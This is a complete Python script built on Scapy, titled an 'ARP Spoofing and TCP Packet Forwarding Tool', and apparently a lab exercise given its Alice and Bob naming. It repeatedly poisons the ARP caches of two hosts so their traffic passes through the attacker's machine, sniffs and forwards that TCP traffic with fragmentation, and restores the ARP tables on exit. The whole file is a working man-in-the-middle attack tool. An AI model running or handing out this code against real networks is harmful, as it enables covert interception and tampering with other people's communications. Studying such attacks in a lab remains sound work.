#!/usr/bin/env python3
# coding: utf-8

import argparse
import time
from multiprocessing import Process
from scapy.all import (
    Ether,
    ARP,
    TCP,
    IP,
    Raw,
    send,
    sniff,
    srp1,
    sendp,
    fragment
)

MTU = 1500  # Maximum Transmission Unit for Ethernet

def get_mac(ip):
    """
    Resolve the MAC address for a given IP by sending an ARP request.
    Returns the MAC as a string, or None if resolution fails.
    """
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, op="who-has")
    reply = srp1(arp_request, verbose=0, timeout=2)
    return reply.src if reply else None

def spoof(target_ip, spoof_ip):
    """
    Send a spoofed ARP reply to target_ip, claiming that spoof_ip has our MAC address.
    """
    target_mac = get_mac(target_ip)
    if target_mac:
        arp_response = ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(arp_response, verbose=0)

def restore(target_ip, source_ip):
    """
    Restore the correct ARP mapping for target_ip by sending a genuine ARP reply.
    """
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    if target_mac and source_mac:
        arp_response = ARP(op="is-at", pdst=target_ip, hwdst=target_mac,
                           psrc=source_ip, hwsrc=source_mac)
        send(arp_response, count=3, verbose=0)

def modify_and_forward(packet):
    """
    Intercept TCP packets, optionally modify their payload, and forward them.
    If the packet is too long (exceeds MTU), fragment it.
    """
    if packet.haslayer(IP) and packet.haslayer(TCP):
        dst_ip = packet[IP].dst
        new_dst_mac = get_mac(dst_ip)
        if not new_dst_mac:
            return

        # Build a new Ethernet frame with the intercepted IP packet.
        new_packet = Ether(dst=new_dst_mac) / packet[IP]

        # Remove checksums so they get recalculated.
        if new_packet.haslayer(IP):
            del new_packet[IP].chksum
        if new_packet.haslayer(TCP):
            del new_packet[TCP].chksum

        # Check if the packet length exceeds the MTU.
        if len(new_packet) > MTU:
            ip_fragments = fragment(new_packet[IP], fragsize=MTU - len(Ether()))
            for frag in ip_fragments:
                sendp(Ether(dst=new_dst_mac) / frag, verbose=0)
        else:
            sendp(new_packet, verbose=0)

def sniff_tcp():
    """
    Sniff TCP packets and process them with modify_and_forward.
    """
    sniff(filter="tcp", prn=modify_and_forward)

def main():
    parser = argparse.ArgumentParser(
        description="ARP Spoofing and TCP Packet Forwarding Tool"
    )
    parser.add_argument('alice', help="Alice's IP address")
    parser.add_argument('bob', help="Bob's IP address")
    args = parser.parse_args()

    alice_ip = args.alice
    bob_ip = args.bob

    # Start the TCP sniffing process.
    sniff_process = Process(target=sniff_tcp)
    sniff_process.start()

    try:
        # Continuously send spoofed ARP responses.
        while True:
            spoof(alice_ip, bob_ip)
            spoof(bob_ip, alice_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        restore(alice_ip, bob_ip)
        restore(bob_ip, alice_ip)
    finally:
        if sniff_process.is_alive():
            sniff_process.terminate()
        sniff_process.join()

if __name__ == '__main__':
    main()
